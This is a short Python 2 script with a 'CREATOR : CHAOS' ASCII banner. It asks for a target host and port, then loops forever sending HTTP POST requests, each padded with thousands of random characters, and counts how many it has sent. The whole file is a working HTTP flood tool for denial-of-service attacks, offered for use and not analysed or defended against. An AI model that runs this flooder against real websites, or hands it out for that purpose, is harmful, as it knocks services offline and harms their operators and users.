import socket, httplib, time, urllib, random
print"""
  
                                                   0000000000000000000000000000000000
                                                  000000000000000000000000000000000000
                                                 00000000000000000000000000000000000000
                                                0000000000000000000000000000000000000000
                                               000000000000000000000000000000000000000000                                                                     
                                              00000000000000000000000000000000000000000000
                                                                      0000000000000000000
                                                                     0000000000000000000
                                                                    0000000000000000000
                      IIIIIIIIIIIIIIII         IIIIIIIIIIIIIIII    00000IIIIIIIIIIIIIIIIIIII     IIIIIIIIIIIIIIIIIIII
                     IIIIIIIIIIIIIIIIII       IIIIIIIIIIIIIIIIII  00000IIIIIIIIIIIIIIIIIIII     IIIIIIIIIIIIIIIIIIII
                    IIIIIIIIIIIIIIIIIIII     IIIIIIIIIIIIIIIIIIII00000IIIIIIIIIIIIIIIIIIII     IIIIIIIIIIIIIIIIIIII
                   IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII     IIIIIIIII
                  IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII     IIIIIIIII
                 IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII     IIIIIIIIIIIIIIIIIIII
                IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII     IIIIIIIIIIIIIIIIIIII
               IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII     IIIIIIIIIIIIIIIIIIII
              IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII                IIIIIIIII
             IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII                IIIIIIIII
            IIIIIIII       IIIII     IIIIIIII       IIIII00000IIIIIIII0000IIIIIIII     IIIIIIIIIIIIIIIIIIII
           IIIIIIIIIIIIIIIIIII      IIIIIIIIIIIIIIIIIII 00000IIIIIIIIIIIIIIIIIIII     IIIIIIIIIIIIIIIIIIII
          IIIIIIIIIIIIIIIII        IIIIIIIIIIIIIIIII   00000IIIIIIIIIIIIIIIIIIII     IIIIIIIIIIIIIIIIIIII
                                                      0000000000000000000
                                                     0000000000000000000
                                                    0000000000000000000
                                           0000000000000000000000000000000000000000000000
                                          0000000000000000000000000000000000000000000000
                                         0000000000000000000000000000000000000000000000
                                        0000000000000000000000000000000000000000000000    
                                      00000000000000000000000000000000000000000000000
                                     00000000000000000000000000000000000000000000000    
 

  CREATOR : CHAOS      DESIGN : ANARCHY    
     
"""
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
u=raw_input('TARGET:\n(www.example.com)\n>')
p=input('port:\n>')
def b(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

i=0
while True:
 try:
  params = urllib.urlencode({'search': b(random.randint(3,10))*1000})
  conn = httplib.HTTPConnection(u, p, timeout=3)
  conn.request("POST", '/', params, headers)
  i+=1
  print '000010011100010 0110010 10011111000111011000110 110001111010101010101 0101101 01001111001111011110 1100100 011101101010110011010111110101101101100 1001111101010100010111110010111011:',i
 except socket.error as e:
  print e